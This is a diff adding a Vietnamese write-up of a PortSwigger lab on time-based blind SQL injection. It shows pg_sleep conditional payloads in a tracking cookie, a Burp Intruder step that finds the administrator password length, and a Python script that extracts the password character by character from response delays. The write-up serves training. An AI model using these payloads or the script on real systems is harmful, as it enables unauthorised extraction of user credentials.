@@ -447,3 +447,58 @@ Bài lab này yêu cầu chúng ta thực hiện khai thác SQL injection để 
 Chúng ta chỉ cần thay đổi giá trị của cookie `TrackingId` thành `' || pg_sleep(10)--` là thành công:
 
 ![image](images/lab-14/lab-14.png)
+
+## Lab 15: [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+
+Trước tiên, chúng ta đổi giá trị của cookie `TrackingId` thành payload `' || (SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)--` và gửi request thì thấy response sau khoảng 2 giây:
+
+![image](images/lab-15/lab-15.png)
+
+Đổi điều kiện `1=1` thành `1=2` trong payload, chúng ta sẽ thấy response luôn:
+
+![image](images/lab-15/lab-15-1.png)
+
+Vậy chúng ta có thể trích xuất thông tin dựa vào thời gian phản hồi của server.
+
+Tiếp theo, sử dụng payload `' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=§1§) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--` để thực hiện brute-force độ dài của password sử dụng Burp Intruder.
+
+Ở payload trên, nếu người dùng là `administrator` và `password` của người dùng này đúng bằng một số nào đó thì chúng ta sẽ nhận về response sau khoảng 2 giây.
+
+![image](images/lab-15/lab-15-2.png)
+
+Sau khi chạy Intruder, chúng ta xác định được độ dài của password là 20:
+
+![image](images/lab-15/lab-15-3.png)
+
+Từ độ dài của password, chúng ta có thể viết script Python sau để tìm được chính xác password.
+
+```python
+import requests
+import string
+
+url = "https://0a7600f20468356580e6ccf4002e00d3.web-security-academy.net/"
+charset = string.ascii_lowercase + string.digits
+password = ""
+
+for i in range(1, 21):
+    for j in charset:
+        cookie = {"TrackingId": f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i}, 1)='{j}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)--"}
+        r = requests.get(url, cookies=cookie)
+
+        if r.elapsed.total_seconds() > 2:
+            password += j
+            break
+
+print(f"administrator:{password}")
+
+```
+
+Cuối cùng, chúng ta sẽ giải được bài lab bằng cách đăng nhập với `administrator:3lf409hp0t5cfg0gj3d9`.
